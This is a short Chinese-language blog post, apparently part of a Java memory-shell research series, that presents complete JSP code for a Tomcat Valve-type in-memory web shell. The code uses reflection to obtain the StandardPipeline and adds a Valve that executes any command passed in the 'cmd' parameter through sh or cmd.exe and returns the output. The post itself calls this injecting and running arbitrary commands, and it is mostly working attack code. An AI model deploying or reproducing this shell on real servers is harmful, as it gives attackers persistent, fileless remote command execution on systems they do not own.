+++
title = "Tomcat Valve型内存马"
date = 2026-06-15T19:53:22+08:00
draft = false
description = "Java 内存马 作为一种无文件落地的木马，研究很有必要"
tags = ["安全研究"]
categories = ["Java内存马"]
series = ["Java内存马基础系列"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++


# 完整代码


```jsp
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="org.apache.catalina.valves.ValveBase" %>  
<%@ page import="org.apache.catalina.connector.Response" %>  
<%@ page import="java.io.IOException" %>  
<%@ page import="org.apache.catalina.core.*" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="java.util.Scanner" %>  
<%@ page import="java.io.PrintWriter" %>  
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
  
<%  
Field requestField = request.getClass().getDeclaredField("request");  
requestField.setAccessible(true);  
final Request req = (Request) requestField.get(request);  
StandardContext standardContext = (StandardContext) req.getContext();  
Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");  
pipelineField.setAccessible(true);  
StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);  
ValveBase evilValve = new ValveBase() {  
@Override  
public void invoke(Request request, Response response) throws ServletException,IOException {  
if (request.getParameter("cmd") != null) {  
boolean isLinux = true;  
String osTyp = System.getProperty("os.name");  
if (osTyp != null && osTyp.toLowerCase().contains("win")) {  
isLinux = false;  
}  
String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};  
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");  
String output = s.hasNext() ? s.next() : "";  
response.setCharacterEncoding("GBK");  
PrintWriter out = response.getWriter();  
out.println(output);  
out.flush();  
out.close();  
}  
this.getNext().invoke(request, response);  
}  
};  
evilStandardPipeline.addValve(evilValve);  
out.println("inject success");  
%>
```


# 编译运行


上面的这个是采用了从`StandardContext`反射获取`StandardPipeline`的方式，效果如下：

发现注入成功了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518134240575.png)

执行任意命令


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518134323499.png)





